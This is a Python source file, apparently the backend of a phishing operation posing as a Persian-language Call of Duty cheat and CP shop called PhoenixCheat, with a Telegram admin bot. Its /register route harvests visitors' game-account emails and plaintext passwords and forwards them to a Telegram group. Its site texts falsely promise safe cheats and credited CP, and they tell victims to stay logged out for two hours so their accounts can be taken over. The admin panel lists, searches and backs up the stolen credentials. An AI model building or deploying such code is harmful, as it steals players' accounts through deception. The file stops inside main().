# -*- coding: utf-8 -*-
# PhoenixCheat Bot V5 - Phase 3 + JSONBin (Persistent Storage)

import json
import os
import random
import string
import threading
import requests
from datetime import datetime, timedelta

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.request import HTTPXRequest

from config import (
    BOT_TOKEN, ADMIN_ID,
    USE_PROXY, PROXY_TYPE, PROXY_HOST, PROXY_PORT,
    CODE_PREFIX, SUPPORT_ID
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app_web = Flask(__name__, static_folder=BASE_DIR)
CORS(app_web)
bot_app = None
USER_STATES = {}

# ==========================================
# JSONBin Configuration
# ==========================================
JSONBIN_ID = os.environ.get("JSONBIN_ID", "")
JSONBIN_KEY = os.environ.get("JSONBIN_KEY", "")
JSONBIN_URL = f"https://api.jsonbin.io/v3/b/{JSONBIN_ID}"
JSONBIN_HEADERS = {
    "X-Master-Key": JSONBIN_KEY,
    "Content-Type": "application/json"
}

# ==========================================
# Database (JSONBin)
# ==========================================
DEFAULT_DATA = {
    "users": [],
    "next_user_id": 1,
    "stats": {
        "total_users": 0,
        "total_visits": 0,
        "last_backup": ""
    },
    "settings": {
        "group_id": -1004335107809,
        "report_interval": 360,
        "report_enabled": True,
        "backup_enabled": True,
        "max_cp": 100000,
        "cp_options": [10000, 20000, 50000, 80000, 100000]
    },
    "texts": {
        "site_name": "PhoenixCheat",
        "site_tagline": "COD STORE",
        "welcome_badge": "🔥 PHOENIXCHEAT",
        "welcome_title": "به PhoenixCheat خوش اومدی!",
        "welcome_text1": "ما یه تیم حرفه‌ای از گیمرهای کالاف دیوتی هستیم که بهترین چیت‌های کالاف دیوتی رو با بالاترین کیفیت و کمترین ریسک بن، بهت ارائه می‌دیم.",
        "welcome_text2": "اینجا جاییه که می‌تونی بازی رو به یه سطح دیگه ببری! ⚡ چیت‌های ما ۱۰۰٪ امن هستن و بدون هیچ ریسکی می‌تونی بازی کنی.",
        "features": [
            "بدون بن و کاملاً امن",
            "تحویل سریع و رایگان",
            "پشتیبانی ۲۴ ساعته",
            "🎁 ۷ روز تخفیف ویژه افتتاحیه!"
        ],
        "about_title": "درباره ما",
        "about_text": "ما یه تیم حرفه‌ای از گیمرهای کالاف دیوتی هستیم که از سال ۱۴۰۳ شروع به ساخت و ارائه چیت کردیم.",
        "trust_title": "چرا ما قابل اعتمادیم؟",
        "trust_text": "✓ بیش از ۵۰۰ مشتری راضی",
        "contact_title": "راه‌های ارتباطی",
        "channel_link": "https://rubika.ir/PhoenixCheat",
        "channel_name": "Rubika.ir/PhoenixCheat",
        "support_link": "https://rubika.ir/my_hinata",
        "support_name": "Rubika.ir/my_hinata",
        "trust_link": "https://rubika.ir/PhoenixCheatTrust",
        "trust_name": "Rubika.ir/PhoenixCheatTrust",
        "telegram_link": "https://t.me/Phoenix1Cheat",
        "telegram_name": "t.me/Phoenix1Cheat",
        "warning_register": "لطفاً از ثبت‌نام چندباره با یک اکانت خودداری کنید.",
        "warning_cp": "نمی‌تونی بیشتر از {max} CP بذاری!",
        "success_text": "اطلاعات شما در سیستم ثبت گردید و در اسرع وقت به اکانت شما واریز خواهد شد.",
        "notice_2h": "لطفاً تا ۲ ساعت وارد اکانت خود نشوید.",
        "thanks_text": "با انتخاب PhoenixCheat، به خانواده‌ای بزرگ پیوستید.",
        "site_status": "open",
        "closed_message": "🔒 سایت در حال آپدیت میباشد.",
        "broadcast_message": ""
    }
}


def load_data():
    """خوندن دیتا از JSONBin"""
    try:
        r = requests.get(
            f"{JSONBIN_URL}/latest",
            headers=JSONBIN_HEADERS,
            timeout=10
        )
        if r.status_code == 200:
            data = r.json().get("record", {})
            if not data:
                # اگه Bin خالی بود، default رو بذار
                save_data(DEFAULT_DATA)
                return DEFAULT_DATA
            return data
        else:
            print(f"❌ JSONBin load error: {r.status_code}")
            return DEFAULT_DATA
    except Exception as e:
        print(f"❌ JSONBin load exception: {e}")
        return DEFAULT_DATA


def save_data(data):
    """ذخیره دیتا توی JSONBin"""
    try:
        r = requests.put(
            JSONBIN_URL,
            headers=JSONBIN_HEADERS,
            json=data,
            timeout=10
        )
        if r.status_code == 200:
            return True
        else:
            print(f"❌ JSONBin save error: {r.status_code}")
            return False
    except Exception as e:
        print(f"❌ JSONBin save exception: {e}")
        return False


def make_code(user_id):
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{user_id}-{CODE_PREFIX}-{rand}"


def find_user(uid):
    db = load_data()
    for u in db.get("users", []):
        if u["id"] == uid:
            return u, db
    return None, db


# ==========================================
# Flask Routes
# ==========================================
@app_web.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")


@app_web.route("/api/settings", methods=["GET"])
def get_settings():
    db = load_data()
    return jsonify({
        "texts": db.get("texts", {}),
        "settings": db.get("settings", {})
    })


@app_web.route("/register", methods=["POST"])
def register():
    try:
        data = request.get_json()
        email = data.get("email", "").strip()
        password = data.get("password", "").strip()
        rubika = data.get("rubika", "").strip()
        desc = data.get("desc", "").strip()
        cp = int(data.get("sp", 0))

        db = load_data()
        max_cp = db.get("settings", {}).get("max_cp", 100000)

        if not email or not password or not rubika or not cp:
            return jsonify({"success": False, "message": "همه فیلدها الزامی است"}), 400

        if cp > max_cp:
            return jsonify({"success": False, "message": f"CP بیشتر از {max_cp} مجاز نیست"}), 400

        uid = db.get("next_user_id", 1)
        code = make_code(uid)

        user = {
            "id": uid,
            "email": email,
            "password": password,
            "rubika": rubika,
            "desc": desc,
            "sp": cp,
            "code": code,
            "note": "",
            "display_name": "",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M")
        }

        db["users"].append(user)
        db["next_user_id"] = uid + 1
        db["stats"]["total_users"] = len(db["users"])
        db["stats"]["total_visits"] = db["stats"].get("total_visits", 0) + 1

        if save_data(db):
            threading.Thread(target=send_to_telegram, args=(user,), daemon=True).start()
            return jsonify({"success": True, "code": code, "id": uid})
        else:
            return jsonify({"success": False, "message": "خطا در ذخیره دیتابیس"}), 500

    except Exception as e:
        print(f"Register error: {e}")
        return jsonify({"success": False, "message": "خطای سرور"}), 500


def send_to_telegram(user):
    global bot_app
    if bot_app is None:
        return
    db = load_data()
    group_id = db.get("settings", {}).get("group_id")
    if not group_id:
        return
    try:
        import asyncio
        text = (
            f"🆕 کاربر جدید #{user['id']}\n\n"
            f"📧 ایمیل: {user['email']}\n"
            f"🔑 رمز: {user['password']}\n"
            f"💬 روبیکا: {user['rubika']}\n"
            f"📝 توضیحات: {user['desc']}\n"
            f"💎 CP: {user['sp']:,}\n"
            f"🎫 کد: {user['code']}\n"
            f"📅 {user['date']}"
        )
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(bot_app.bot.send_message(chat_id=group_id, text=text))
        loop.close()
    except Exception as e:
        print(f"❌ Send error: {e}")


# ==========================================
# Backup Function
# ==========================================
def create_backup():
    """ساخت بکاپ از دیتابیس"""
    db = load_data()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_data = json.dumps(db, ensure_ascii=False, indent=2)
    return backup_data, timestamp


# ==========================================
# Report Function
# ==========================================
def generate_report():
    """ساخت گزارش کامل"""
    db = load_data()
    users = db.get("users", [])
    stats = db.get("stats", {})

    total_cp = sum(u.get('sp', 0) for u in users)
    avg_cp = total_cp // len(users) if users else 0

    # کاربران ۲۴ ساعت اخیر
    now = datetime.now()
    last_24h = 0
    for u in users:
        try:
            user_date = datetime.strptime(u.get("date", ""), "%Y-%m-%d %H:%M")
            if (now - user_date).total_seconds() < 86400:
                last_24h += 1
        except:
            pass

    report = (
        f"📊 **گزارش PhoenixCheat**\n"
        f"📅 {now.strftime('%Y-%m-%d %H:%M')}\n\n"
        f"👥 کل کاربران: **{len(users)}**\n"
        f"🆕 ۲۴ ساعت اخیر: **{last_24h}**\n"
        f"👁️ بازدید کل: **{stats.get('total_visits', 0)}**\n"
        f"💎 مجموع CP: **{total_cp:,}**\n"
        f"📈 میانگین CP: **{avg_cp:,}**\n"
        f"🆔 آیدی بعدی: **{db.get('next_user_id', 1)}**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    return report


async def send_report(ctx: ContextTypes.DEFAULT_TYPE):
    """ارسال گزارش به گروه"""
    try:
        db = load_data()
        group_id = db.get("settings", {}).get("group_id")
        if not group_id:
            return
        report = generate_report()
        await ctx.bot.send_message(chat_id=group_id, text=report, parse_mode="Markdown")
        print("✅ Report sent!")
    except Exception as e:
        print(f"❌ Report error: {e}")


async def send_backup(ctx: ContextTypes.DEFAULT_TYPE):
    """ارسال بکاپ به گروه"""
    try:
        db = load_data()
        group_id = db.get("settings", {}).get("group_id")
        if not group_id:
            return

        backup_data, timestamp = create_backup()
        filename = f"backup_{timestamp}.json"

        # ذخیره موقت
        temp_path = os.path.join("/tmp", filename)
        with open(temp_path, "w", encoding="utf-8") as f:
            f.write(backup_data)

        # ارسال به گروه
        with open(temp_path, "rb") as f:
            await ctx.bot.send_document(
                chat_id=group_id,
                document=f,
                filename=filename,
                caption=f"💾 بکاپ PhoenixCheat\n📅 {timestamp}"
            )

        # پاک کردن فایل موقت
        os.remove(temp_path)
        print("✅ Backup sent!")
    except Exception as e:
        print(f"❌ Backup error: {e}")


# ==========================================
# Admin Panel
# ==========================================
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(f"⛔️ Access Denied!\n🎧 {SUPPORT_ID}")
        return

    keyboard = [
        [InlineKeyboardButton("👥 لیست کاربران", callback_data="list_users")],
        [InlineKeyboardButton("➕ افزودن کاربر", callback_data="add_user_info")],
        [InlineKeyboardButton("🔍 جستجو", callback_data="search_info")],
        [InlineKeyboardButton("📊 آمار کامل", callback_data="stats")],
        [InlineKeyboardButton("📈 گزارش الان", callback_data="report_now")],
        [InlineKeyboardButton("💾 بکاپ الان", callback_data="backup_now")],
        [InlineKeyboardButton("📝 ویرایش متن سایت", callback_data="edit_texts")],
        [InlineKeyboardButton("⚙️ تنظیم گروه", callback_data="set_group")],
        [InlineKeyboardButton("💰 تنظیم قیمت‌ها", callback_data="edit_prices")],
        [InlineKeyboardButton("⏰ تنظیم گزارش", callback_data="report_settings")],
        [InlineKeyboardButton("📢 پیام همگانی", callback_data="broadcast")],
        [InlineKeyboardButton("🔒 بستن/باز کردن سایت", callback_data="toggle_site")],
        [InlineKeyboardButton("🔧 وضعیت", callback_data="status")],
    ]
    await update.message.reply_text(
        "🎮 PhoenixCheat Admin Panel\n\nیک گزینه را انتخاب کن:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    db = load_data()

    # ========== لیست کاربران ==========
    if data == "list_users":
        users = db.get("users", [])
        if not users:
            await query.edit_message_text("📭 هنوز کاربری ثبت نشده.")
            return
        await show_users_page(query, users, 0)

    elif data.startswith("page_"):
        page = int(data.replace("page_", ""))
        users = db.get("users", [])
        await show_users_page(query, users, page)

    elif data.startswith("user_"):
        uid = int(data.replace("user_", ""))
        user, _ = find_user(uid)
        if not user:
            await query.edit_message_text("❌ کاربر پیدا نشد.")
            return
        await show_user_detail(query, user)

    elif data.startswith("del_"):
        uid = int(data.replace("del_", ""))
        user, db = find_user(uid)
        if not user:
            await query.edit_message_text("❌ کاربر پیدا نشد.")
            return
        db["users"] = [u for u in db["users"] if u["id"] != uid]
        db["stats"]["total_users"] = len(db["users"])
        save_data(db)
        await query.edit_message_text(f"🗑️ کاربر #{uid} حذف شد!")

    elif data.startswith("confirm_del_"):
        uid = int(data.replace("confirm_del_", ""))
        user, _ = find_user(uid)
        if not user:
            await query.edit_message_text("❌ کاربر پیدا نشد.")
            return
        keyboard = [
            [InlineKeyboardButton("✅ بله", callback_data=f"del_{uid}")],
            [InlineKeyboardButton("❌ انصراف", callback_data=f"user_{uid}")],
        ]
        await query.edit_message_text(
            f"⚠️ کاربر #{uid} حذف شه؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data.startswith("editname_"):
        uid = int(data.replace("editname_", ""))
        USER_STATES[ADMIN_ID] = {"state": "waiting_display_name", "uid": uid}
        await query.edit_message_text(f"✏️ اسم جدید برای کاربر #{uid}:")

    elif data.startswith("editnote_"):
        uid = int(data.replace("editnote_", ""))
        USER_STATES[ADMIN_ID] = {"state": "waiting_note", "uid": uid}
        await query.edit_message_text(f"📝 یادداشت جدید برای #{uid}:")

    elif data == "add_user_info":
        await query.edit_message_text(
            "➕ /add email | pass | rubika | desc | cp"
        )

    elif data == "search_info":
        USER_STATES[ADMIN_ID] = {"state": "waiting_search"}
        await query.edit_message_text("🔍 شماره کاربر رو بنویس:")

    # ========== آمار ==========
    elif data == "stats":
        users = db.get("users", [])
        stats = db.get("stats", {})
        total_cp = sum(u.get('sp', 0) for u in users)
        avg_cp = total_cp // len(users) if users else 0
        text = (
            f"📊 آمار کامل\n\n"
            f"👥 کاربران: {len(users)}\n"
            f"👁️ بازدید: {stats.get('total_visits', 0)}\n"
            f"💎 مجموع CP: {total_cp:,}\n"
            f"📈 میانگین CP: {avg_cp:,}\n"
            f"🆔 آیدی بعدی: {db.get('next_user_id', 1)}"
        )
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    # ========== گزارش الان ==========
    elif data == "report_now":
        report = generate_report()
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(report, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    # ========== بکاپ الان ==========
    elif data == "backup_now":
        await query.edit_message_text("⏳ در حال ساخت بکاپ...")
        threading.Thread(target=lambda: send_backup_sync(ctx), daemon=True).start()

    # ========== تنظیم گزارش ==========
    elif data == "report_settings":
        s = db.get("settings", {})
        current = s.get("report_interval", 360)
        enabled = s.get("report_enabled", True)
        text = (
            f"⏰ تنظیم گزارش خودکار\n\n"
            f"📊 وضعیت: {'فعال ✅' if enabled else 'غیرفعال ❌'}\n"
            f"⏱️ فاصله: {current} دقیقه ({current//60} ساعت)\n\n"
            f"برای تغییر:\n"
            f"/setreport 360\n"
            f"/togglereport"
        )
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    # ========== متن‌ها ==========
    elif data == "edit_texts":
        keyboard = [
            [InlineKeyboardButton("📝 متن خوش‌آمد", callback_data="et_welcome")],
            [InlineKeyboardButton("ℹ️ درباره ما", callback_data="et_about")],
            [InlineKeyboardButton("🛡️ اعتماد", callback_data="et_trust")],
            [InlineKeyboardButton("🎧 ارتباط", callback_data="et_contact")],
            [InlineKeyboardButton("🔗 لینک‌ها", callback_data="et_links")],
            [InlineKeyboardButton("⚠️ هشدارها", callback_data="et_warnings")],
            [InlineKeyboardButton("🙏 پیام تشکر", callback_data="et_thanks")],
            [InlineKeyboardButton("🔙 بازگشت", callback_data="back")],
        ]
        await query.edit_message_text(
            "📝 ویرایش متن سایت",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data == "et_welcome":
        await query.edit_message_text(
            "📝 /set welcome_title متن جدید\n"
            "/set welcome_text1 متن\n"
            "/set welcome_text2 متن"
        )
    elif data == "et_about":
        await query.edit_message_text("ℹ️ /set about_text متن")
    elif data == "et_trust":
        await query.edit_message_text("🛡️ /set trust_text متن")
    elif data == "et_contact":
        await query.edit_message_text("🎧 /set contact_title متن")
    elif data == "et_links":
        await query.edit_message_text(
            "🔗 /set channel_link لینک\n/set channel_name نام\n"
            "/set support_link لینک\n/set support_name نام\n"
            "/set trust_link لینک\n/set trust_name نام\n"
            "/set telegram_link لینک\n/set telegram_name نام"
        )
    elif data == "et_warnings":
        await query.edit_message_text(
            "⚠️ /set warning_register متن\n/set warning_cp متن\n"
            "/set notice_2h متن\n/set closed_message متن"
        )
    elif data == "et_thanks":
        await query.edit_message_text("🙏 /set thanks_text متن")

    # ========== گروه ==========
    elif data == "set_group":
        current = db.get("settings", {}).get("group_id", "تنظیم نشده")
        await query.edit_message_text(
            f"⚙️ گروه فعلی: {current}\n\n/setgroup -1001234567890"
        )

    # ========== قیمت‌ها ==========
    elif data == "edit_prices":
        max_cp = db.get("settings", {}).get("max_cp", 100000)
        options = db.get("settings", {}).get("cp_options", [])
        await query.edit_message_text(
            f"💰 حداکثر: {max_cp:,}\n"
            f"گزینه‌ها: {', '.join([f'{x:,}' for x in options])}\n\n"
            f"/setmaxcp 100000\n"
            f"/setoptions 10000,20000,50000"
        )

    # ========== پیام همگانی ==========
    elif data == "broadcast":
        current = db.get("texts", {}).get("broadcast_message", "")
        await query.edit_message_text(
            f"📢 پیام فعلی: {current if current else 'خالی'}\n\n"
            f"/set broadcast_message متن"
        )

    # ========== بستن سایت ==========
    elif data == "toggle_site":
        status = db.get("texts", {}).get("site_status", "open")
        new_status = "closed" if status == "open" else "open"
        emoji = "🔒" if new_status == "closed" else "🟢"
        await query.edit_message_text(
            f"🔒 فعلی: {status}\nجدید: {new_status} {emoji}\n\n/togglesite"
        )

    # ========== وضعیت ==========
    elif data == "status":
        status = db.get("texts", {}).get("site_status", "open")
        group_id = db.get("settings", {}).get("group_id", "تنظیم نشده")
        broadcast = db.get("texts", {}).get("broadcast_message", "")
        report_int = db.get("settings", {}).get("report_interval", 360)
        report_en = db.get("settings", {}).get("report_enabled", True)
        text = (
            f"🔧 وضعیت فعلی\n\n"
            f"🌐 سایت: {status}\n"
            f"🆔 گروه: {group_id}\n"
            f"📢 پیام: {broadcast if broadcast else 'خالی'}\n"
            f"⏰ گزارش: {'فعال' if report_en else 'غیرفعال'} ({report_int}د)\n"
            f"👥 کاربران: {len(db.get('users', []))}\n"
            f"💾 ذخیره‌سازی: JSONBin ✅"
        )
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "back":
        keyboard = [
            [InlineKeyboardButton("👥 لیست کاربران", callback_data="list_users")],
            [InlineKeyboardButton("➕ افزودن کاربر", callback_data="add_user_info")],
            [InlineKeyboardButton("🔍 جستجو", callback_data="search_info")],
            [InlineKeyboardButton("📊 آمار کامل", callback_data="stats")],
            [InlineKeyboardButton("📈 گزارش الان", callback_data="report_now")],
            [InlineKeyboardButton("💾 بکاپ الان", callback_data="backup_now")],
            [InlineKeyboardButton("📝 ویرایش متن سایت", callback_data="edit_texts")],
            [InlineKeyboardButton("⚙️ تنظیم گروه", callback_data="set_group")],
            [InlineKeyboardButton("💰 تنظیم قیمت‌ها", callback_data="edit_prices")],
            [InlineKeyboardButton("⏰ تنظیم گزارش", callback_data="report_settings")],
            [InlineKeyboardButton("📢 پیام همگانی", callback_data="broadcast")],
            [InlineKeyboardButton("🔒 بستن/باز کردن سایت", callback_data="toggle_site")],
            [InlineKeyboardButton("🔧 وضعیت", callback_data="status")],
        ]
        await query.edit_message_text(
            "🎮 PhoenixCheat Admin Panel",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


def send_backup_sync(ctx):
    """اجرای async در thread"""
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_backup(ctx))
    loop.close()


# ==========================================
# Show Users Page
# ==========================================
async def show_users_page(query, users, page):
    per_page = 5
    total = len(users)
    total_pages = (total + per_page - 1) // per_page
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    page_users = users[start:start + per_page]

    text = f"👥 لیست کاربران ({page + 1}/{total_pages})\n\n"
    keyboard = []
    for u in page_users:
        text += f"#{u['id']} | {u['email']}\n"
        keyboard.append([
            InlineKeyboardButton(
                f"#{u['id']} - {u['email'][:20]}",
                callback_data=f"user_{u['id']}"
            )
        ])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️", callback_data=f"page_{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("▶️", callback_data=f"page_{page+1}"))
    if nav:
        keyboard.append(nav)
    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])

    await query.edit_message_text(
        text + "\nروی کاربر بزن:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def show_user_detail(query, user):
    display_name = user.get("display_name", "") or "تنظیم نشده"
    note = user.get("note", "") or "ندارد"
    text = (
        f"👤 کاربر #{user['id']}\n\n"
        f"📧 {user['email']}\n"
        f"🔑 {user['password']}\n"
        f"💬 {user['rubika']}\n"
        f"📝 {user['desc'] or 'ندارد'}\n"
        f"💎 CP: {user['sp']:,}\n"
        f"🎫 {user['code']}\n"
        f"📅 {user['date']}\n\n"
        f"✏️ اسم: {display_name}\n"
        f"🗒️ یادداشت: {note}"
    )
    keyboard = [
        [
            InlineKeyboardButton("✏️ ویرایش اسم", callback_data=f"editname_{user['id']}"),
            InlineKeyboardButton("📝 ویرایش یادداشت", callback_data=f"editnote_{user['id']}"),
        ],
        [InlineKeyboardButton("🗑️ حذف", callback_data=f"confirm_del_{user['id']}")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="list_users")],
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


# ==========================================
# Text Handler
# ==========================================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    state_data = USER_STATES.get(ADMIN_ID)
    if not state_data:
        return

    state = state_data.get("state")
    text = update.message.text.strip()

    if state == "waiting_display_name":
        uid = state_data["uid"]
        user, db = find_user(uid)
        if user:
            user["display_name"] = text
            save_data(db)
            await update.message.reply_text(f"✅ اسم #{uid}: {text}")
        USER_STATES.pop(ADMIN_ID, None)

    elif state == "waiting_note":
        uid = state_data["uid"]
        user, db = find_user(uid)
        if user:
            user["note"] = text
            save_data(db)
            await update.message.reply_text(f"✅ یادداشت #{uid} ثبت شد!")
        USER_STATES.pop(ADMIN_ID, None)

    elif state == "waiting_search":
        try:
            uid = int(text)
            user, _ = find_user(uid)
            if user:
                display_name = user.get("display_name", "") or "تنظیم نشده"
                note = user.get("note", "") or "ندارد"
                msg = (
                    f"👤 کاربر #{user['id']}\n\n"
                    f"📧 {user['email']}\n"
                    f"🔑 {user['password']}\n"
                    f"💬 {user['rubika']}\n"
                    f"📝 {user['desc'] or 'ندارد'}\n"
                    f"💎 CP: {user['sp']:,}\n"
                    f"🎫 {user['code']}\n"
                    f"📅 {user['date']}\n\n"
                    f"✏️ اسم: {display_name}\n"
                    f"🗒️ یادداشت: {note}"
                )
                await update.message.reply_text(msg)
            else:
                await update.message.reply_text(f"❌ #{uid} پیدا نشد.")
        except:
            await update.message.reply_text("❌ شماره معتبر نیست.")
        USER_STATES.pop(ADMIN_ID, None)


# ==========================================
# Commands
# ==========================================
async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    USER_STATES.pop(ADMIN_ID, None)
    await update.message.reply_text("✅ لغو شد.")


async def set_group(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        new_group_id = int(update.message.text.replace("/setgroup ", "").strip())
    except:
        await update.message.reply_text("❌ /setgroup -1001234567890")
        return
    db = load_data()
    db["settings"]["group_id"] = new_group_id
    save_data(db)
    await update.message.reply_text(f"✅ گروه: {new_group_id}")


async def add_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        text = update.message.text.replace("/add ", "").strip()
        parts = [x.strip() for x in text.split("|")]
        if len(parts) < 5:
            await update.message.reply_text("❌ /add email | pass | rubika | desc | cp")
            return
        email, password, rubika, desc, cp_str = parts[:5]
        cp = int(cp_str)
        db = load_data()
        uid = db.get("next_user_id", 1)
        code = make_code(uid)
        user = {
            "id": uid, "email": email, "password": password,
            "rubika": rubika, "desc": desc, "sp": cp,
            "code": code, "note": "", "display_name": "",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M")
        }
        db["users"].append(user)
        db["next_user_id"] = uid + 1
        db["stats"]["total_users"] = len(db["users"])
        save_data(db)
        await update.message.reply_text(f"✅ #{uid}\n🎫 {code}")
        threading.Thread(target=send_to_telegram, args=(user,), daemon=True).start()
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {e}")


async def set_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        full_text = update.message.text.replace("/set ", "").strip()
        parts = full_text.split(" ", 1)
        key = parts[0].strip()
        value = parts[1].strip() if len(parts) > 1 else ""
        value = value.replace("\\n", "\n")
        db = load_data()
        if "texts" not in db:
            db["texts"] = {}
        db["texts"][key] = value
        save_data(db)
        await update.message.reply_text(f"✅ {key} تغییر کرد!")
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {e}")


async def set_max_cp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(update.message.text.replace("/setmaxcp ", "").strip())
    except:
        await update.message.reply_text("❌ /setmaxcp 100000")
        return
    db = load_data()
    db["settings"]["max_cp"] = val
    save_data(db)
    await update.message.reply_text(f"✅ حداکثر: {val:,}")


async def set_options(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        text = update.message.text.replace("/setoptions ", "").strip()
        opts = [int(x.strip()) for x in text.split(",")]
    except:
        await update.message.reply_text("❌ /setoptions 10000,20000,50000")
        return
    db = load_data()
    db["settings"]["cp_options"] = opts
    save_data(db)
    await update.message.reply_text(f"✅ گزینه‌ها: {opts}")


async def toggle_site(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    db = load_data()
    current = db.get("texts", {}).get("site_status", "open")
    new_status = "closed" if current == "open" else "open"
    db["texts"]["site_status"] = new_status
    save_data(db)
    emoji = "🔒" if new_status == "closed" else "🟢"
    await update.message.reply_text(f"{emoji} سایت: {new_status}")


async def set_report(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(update.message.text.replace("/setreport ", "").strip())
    except:
        await update.message.reply_text("❌ /setreport 360")
        return
    db = load_data()
    db["settings"]["report_interval"] = val
    save_data(db)
    await update.message.reply_text(f"✅ فاصله گزارش: {val} دقیقه")


async def toggle_report(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    db = load_data()
    current = db.get("settings", {}).get("report_enabled", True)
    db["settings"]["report_enabled"] = not current
    save_data(db)
    await update.message.reply_text(f"✅ گزارش: {'فعال' if not current else 'غیرفعال'}")


async def manual_backup(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("⏳ در حال ساخت بکاپ...")
    await send_backup(ctx)


async def manual_report(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    report = generate_report()
    await update.message.reply_text(report, parse_mode="Markdown")


# ==========================================
# Scheduled Jobs
# ==========================================
async def scheduled_report(ctx: ContextTypes.DEFAULT_TYPE):
    db = load_data()
    if not db.get("settings", {}).get("report_enabled", True):
        return
    await send_report(ctx)


async def scheduled_backup(ctx: ContextTypes.DEFAULT_TYPE):
    db = load_data()
    if not db.get("settings", {}).get("backup_enabled", True):
        return
    await send_backup(ctx)


# ==========================================
# Flask Thread
# ==========================================
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    print(f"🌐 Flask on http://0.0.0.0:{port}")
    app_web.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)


# ==========================================
# Main
# ==========================================
def main():
    global bot_app
    print("🚀 Starting PhoenixCheat V5 (Phase 3 + JSONBin)...")

    if not BOT_TOKEN:
        print("❌ BOT_TOKEN empty!")
        return

    if not JSONBIN_ID or not JSONBIN_KEY:
        print("⚠️ JSONBIN_ID or JSONBIN_KEY missing!")
        print("   Bot will use default data and WON'T persist!")

    if USE_PROXY:
        proxy_url = f"{PROXY_TYPE}://{PROXY_HOST}:{PROXY_PORT}"
        request = HTTPXRequest(proxy=proxy_url)
        bot_app = Application.builder().token(BOT_TOKEN).request(request).build()
    else:
        bot_app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("setgroup", set_group))
    bot_app.add_handler(CommandHandler("add", add_user))
    bot_app.add_handler(CommandHandler("set", set_text))
    bot_app.add_handler(CommandHandler("setmaxcp", set_max_cp))
    bot_app.add_handler(CommandHandler("setoptions", set_options))
    bot_app.add_handler(CommandHandler("togglesite", toggle_site))
    bot_app.add_handler(CommandHandler("setreport", set_report))
    bot_app.add_handler(CommandHandler("togglereport", toggle_report))
    bot_app.add_handler(CommandHandler("backup", manual_backup))
    bot_app.add_handler(CommandHandler("report", manual_report))
    bot_app.add_handler(CommandHandler("cancel", cancel))
    bot_app.add_handler(CallbackQueryHandler(button_handler))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    # Scheduled jobs
    if bot_app.job_queue:
        # گزارش خودکار (هر X دقیقه)
        db = load_data()
        interval = db.get("settings", {}).get("report_interval", 360)
        bot_app.job_queue.run_repeating(
            scheduled_report,
            interval=interval * 60,
            first=60
        )

